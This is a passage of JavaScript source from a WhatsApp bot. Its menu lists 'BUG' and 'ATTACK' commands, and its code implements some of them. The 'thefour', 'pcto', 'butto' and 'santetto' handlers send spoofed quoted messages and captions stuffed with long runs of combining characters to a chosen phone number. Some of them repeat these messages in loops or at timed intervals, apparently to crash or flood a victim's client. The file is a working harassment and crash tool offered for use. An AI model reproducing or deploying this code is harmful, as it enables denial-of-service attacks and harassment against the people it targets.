│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}keluar
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘 ISLAMIC MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}iqra
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hadist
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}alquran
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}juzamma
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tafsirsurah
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘 VOICE MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bass
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}blown
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}deep
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}earrape
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}fast
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}fat
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nightcore
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}reverse
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}robot
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}slow
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tupai
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 OWNER MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}react [emoji]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}chat [option]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}join [link]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}leave
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}block @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}unblock @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bcgroup [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bcall [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setppbot [image]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setexif
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setmenu [option]
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│    〘 BUG MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}thefour (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}datuisme (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}atebakat (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}irfancrash (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}buttonfour (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}buglist (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tagwae (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}catalog (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bugvn (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bugstik (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}troli (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}doc (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug1 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug2 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug3 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug4 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug5 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug6 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bug7 (jumlah)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hello
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}momo
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tengkorak
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}santet
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}modar
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}infinite
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}brother
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}yuhu
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hihi
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘 ATTACK MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}vnto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}pcto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}butto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}stikto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}helloto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}momoto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tengkorakto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}santetto <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}modarto <target>
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}infiniteto <target> 
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘 ATTACK2 MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gasvn <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gasstik <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gashello <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gasmomo <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gastengkorak <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gassantet <target> 
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gasmodar <target>
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gasinfinite <target> 
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│    〘 THANKS TO 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ THE JO BOT
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ HW Mods
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ranz
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Hanz
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Pak Tzy
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Dittaz
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Dika
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 

© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰
`
                let btn = [{
                                urlButton: {
                                    displayText: 'Channel 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰',
                                    url: 'https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+6017-7426853'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        hisoka.send5ButImg(m.chat, anu, hisoka.user.name, global.thumb, btn)
                        } else if (setbot.templateGif) {
                        hisoka.send5ButGif(m.chat, anu, hisoka.user.name, global.visoka, btn)
                        } else if (setbot.templateVid) {
                        hisoka.send5ButVid(m.chat, anu, hisoka.user.name, global.visoka, btn)
                        } else if (setbot.templateMsg) {
                        hisoka.send5ButMsg(m.chat, anu, hisoka.user.name, btn)
                        }
   hey = fs.readFileSync('hahaha.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: m})
                     }
            break
        case 'thefour': {         
          if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
           asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🇹 🇭 🇪 🇫 🇴 🇺 🇷`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            hisoka.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇫 🇴 🇺 🇷"},{quoted:asukonyol11})
            await sleep(30000)}
            }
            break
            case 'pcto':
                if (!isCreator) return
                if (!text) throw `Nomernya mana?`
                gasbugpc = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
                hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰"},{quoted:gasbugpc})
                m.reply(`succes`)

                break
                case 'butto':
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      hisoka.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      m.reply(`succes`)
                    break
           case 'santetto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
